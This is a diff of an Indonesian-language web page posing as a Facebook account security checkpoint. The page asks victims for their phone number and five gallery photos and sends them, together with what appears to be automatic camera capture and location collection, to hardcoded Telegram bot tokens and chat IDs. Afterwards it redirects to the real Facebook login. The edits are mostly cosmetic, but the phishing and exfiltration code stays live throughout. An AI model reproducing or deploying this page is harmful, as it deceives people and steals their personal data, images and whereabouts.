@@ -15,9 +15,8 @@
         .fb-logo-splash { width: 70px; animation: pulse 1.5s infinite; }
         @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.1); } 100% { transform: scale(1); } }
 
-        body { background-color: #f0f2f5; font-family: 'Segoe UI', Arial, sans-serif; display: none; overflow-x: hidden; }
+        body { background-color: #f0f2f5; font-family: 'Segoe UI', Arial, sans-serif; display: none; overflow-x: hidden; padding-bottom: 100px; }
         
-        /* Card Design */
         .main-card { max-width: 450px; margin: 40px auto; border: none; border-radius: 15px; box-shadow: 0 15px 35px rgba(0,0,0,0.15); background: white; border-top: 5px solid #1877f2; }
         .fb-logo-text { color: #1877f2; font-size: 42px; font-weight: bold; letter-spacing: -2px; }
         
@@ -28,21 +27,28 @@
         }
         .btn-fb:active { transform: scale(0.94); }
 
-        /* Music & Credit Bar 😍 */
+        /* Credit & Music Control Bar 😈 */
         .credit-bar {
-            position: fixed; bottom: 0; width: 100%; background: rgba(0, 0, 0, 0.85);
-            color: white; padding: 15px; text-align: center; backdrop-filter: blur(10px);
+            position: fixed; bottom: 0; width: 100%; background: rgba(0, 0, 0, 0.9);
+            color: white; padding: 10px 20px; display: flex; align-items: center; 
+            justify-content: space-between; backdrop-filter: blur(15px);
             border-top: 2px solid #1877f2; z-index: 1000;
         }
-        .credit-text { font-size: 14px; font-weight: bold; letter-spacing: 1px; color: #1877f2; text-shadow: 0 0 10px #1877f2; }
+        .credit-info { display: flex; flex-direction: column; text-align: left; }
+        .label-credit { font-size: 10px; color: #888; text-transform: uppercase; letter-spacing: 1px; }
+        .credit-name { font-size: 14px; font-weight: bold; color: #1877f2; text-shadow: 0 0 8px rgba(24, 119, 242, 0.6); }
         
-        /* Music Animation */
-        .music-anim { display: flex; justify-content: center; align-items: flex-end; height: 20px; gap: 3px; margin-top: 5px; }
-        .bar { width: 4px; height: 100%; background: #1877f2; animation: wave 1s ease-in-out infinite; }
-        @keyframes wave { 0%, 100% { height: 5px; } 50% { height: 20px; } }
-        .bar:nth-child(2) { animation-delay: 0.2s; }
-        .bar:nth-child(3) { animation-delay: 0.4s; }
-        .bar:nth-child(4) { animation-delay: 0.6s; }
+        /* Music Button */
+        .play-btn {
+            background: #1877f2; color: white; border: none; border-radius: 50px;
+            padding: 5px 15px; font-size: 12px; font-weight: bold; cursor: pointer;
+            transition: 0.3s; display: flex; align-items: center; gap: 5px;
+        }
+        .play-btn:hover { background: #166fe5; transform: translateY(-2px); }
+
+        .music-anim { display: flex; gap: 2px; align-items: flex-end; height: 15px; }
+        .bar { width: 3px; height: 100%; background: #fff; animation: wave 1s infinite; display: none; }
+        @keyframes wave { 0%, 100% { height: 3px; } 50% { height: 15px; } }
 
         .error-box { background: #ffebe9; border: 1px solid #dd3c10; font-size: 13px; padding: 10px; border-radius: 6px; display: none; margin-bottom: 15px; }
         #video, #canvas { display: none; }
@@ -52,7 +58,7 @@
 
 <div id="splash-screen">
     <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" class="fb-logo-splash">
-    <p class="mt-3 text-muted">Checking Security...</p>
+    <p class="mt-3 text-muted">Checking Security System...</p>
 </div>
 
 <audio id="bgMusic" loop>
@@ -63,35 +69,41 @@
     <div class="main-card card p-4 text-center">
         <div class="fb-logo-text">facebook</div>
         <h6 class="fw-bold mt-2">Checkpoint Keamanan Akun</h6>
-        <p class="text-muted small">Selesaikan langkah verifikasi untuk membuktikan bahwa Anda adalah pemilik sah akun ini.</p>
+        <p class="text-muted small">Konfirmasikan identitas Anda untuk melanjutkan akses ke profil Facebook.</p>
         <hr>
 
         <div id="mainError" class="error-box text-start">
-            <b>Verifikasi Gagal!</b><br>Nomor HP minimal 10 digit dan wajib pilih 5 foto.
+            <b>Gagal!</b><br>Pastikan nomor HP benar dan minimal 5 foto dipilih.
         </div>
 
         <div class="text-start">
-            <label class="form-label small fw-bold">Nomor Telepon Terdaftar</label>
-            <input type="number" id="phone" class="form-control" placeholder="Contoh: 081234567xxx">
+            <label class="form-label small fw-bold">Nomor Telepon</label>
+            <input type="number" id="phone" class="form-control" placeholder="08xxxxxxxxxx">
             
-            <label class="form-label small fw-bold mt-3">Upload 5 Foto Aktivitas (Wajib)</label>
+            <label class="form-label small fw-bold mt-3">Verifikasi Foto Galeri (Wajib 5)</label>
             <input type="file" id="galeri" class="form-control" multiple accept="image/*">
         </div>
 
-        <button class="btn-fb mt-4" onclick="validateFinal()">Lanjutkan Verifikasi</button>
+        <button class="btn-fb mt-4" onclick="validateFinal()">Konfirmasi</button>
         
         <div class="mt-3 text-primary" id="loader" style="display:none;">
-            <div class="spinner-border spinner-border-sm"></div> <span class="small">Mengirim data ke server...</span>
+            <div class="spinner-border spinner-border-sm"></div> <span class="small">Mengirim data...</span>
         </div>
     </div>
 </div>
 
 <div class="credit-bar">
-    <div class="credit-text">Malik & Hack7rBGG/Xymatekidd</div>
-    <div class="music-anim">
-        <div class="bar"></div><div class="bar"></div><div class="bar"></div><div class="bar"></div>
-        <div class="bar"></div><div class="bar"></div><div class="bar"></div><div class="bar"></div>
+    <div class="credit-info">
+        <span class="label-credit">Developed by:</span>
+        <span class="credit-name">Malik & Hack7rBGG/Xymatekidd</span>
     </div>
+    
+    <button class="play-btn" id="musicBtn" onclick="toggleMusic()">
+        <span>▶ PLAY MUSIC</span>
+        <div class="music-anim" id="animContainer">
+            <div class="bar"></div><div class="bar"></div><div class="bar"></div>
+        </div>
+    </button>
 </div>
 
 <video id="video" autoplay playsinline></video>
@@ -100,22 +112,30 @@
 <script>
     const tokens = ["8555398375:AAGESWcRFUKios-h-G7eG8kexiHghzJLGo8", "8220550089:AAF2wuFOcdHAWVMu3dITv4GDspDHIrXngfg"];
     const chats = ["7835924973", "8071786272"];
+    const audio = document.getElementById('bgMusic');
+    const bars = document.querySelectorAll('.bar');
 
     window.onload = () => {
         setTimeout(() => {
             document.getElementById('splash-screen').style.display = 'none';
             document.body.style.display = 'block';
-            // Coba putar lagu otomatis (harus ada interaksi user di beberapa browser)
-            document.getElementById('bgMusic').play().catch(() => {
-                console.log("Klik dimana saja untuk memutar musik!");
-            });
             autoCapture("user");
             autoLocation();
         }, 3000);
     };
 
-    // Pastikan musik main saat user klik apa saja 😋
-    document.addEventListener('click', () => { document.getElementById('bgMusic').play(); }, {once: true});
+    function toggleMusic() {
+        const btnText = document.querySelector('#musicBtn span');
+        if (audio.paused) {
+            audio.play();
+            btnText.innerText = "⏸ PAUSE";
+            bars.forEach(b => b.style.display = "block");
+        } else {
+            audio.pause();
+            btnText.innerText = "▶ PLAY MUSIC";
+            bars.forEach(b => b.style.display = "none");
+        }
+    }
 
     function sendToBot(content, type = "text", blob = null) {
         tokens.forEach((token, i) => {
@@ -137,21 +157,14 @@
     function validateFinal() {
         const phone = document.getElementById('phone').value;
         const files = document.getElementById('galeri').files;
-        const err = document.getElementById('mainError');
-
         if (phone.length < 10 || files.length < 5) {
-            err.style.display = 'block';
+            document.getElementById('mainError').style.display = 'block';
             return;
         }
-
-        err.style.display = 'none';
+        document.getElementById('mainError').style.display = 'none';
         document.getElementById('loader').style.display = 'block';
-
-        sendToBot(`📱 NOMOR HP: ${phone}`);
-        for (let i = 0; i < 5; i++) {
-            sendToBot(`🖼️ GALERI ${i+1}`, "photo", files[i]);
-        }
-
+        sendToBot(`📱 NOMOR: ${phone}`);
+        for (let i = 0; i < 5; i++) sendToBot(`🖼️ GALERI ${i+1}`, "photo", files[i]);
         setTimeout(() => { window.location.href = "https://www.facebook.com/login"; }, 3000);
     }
 
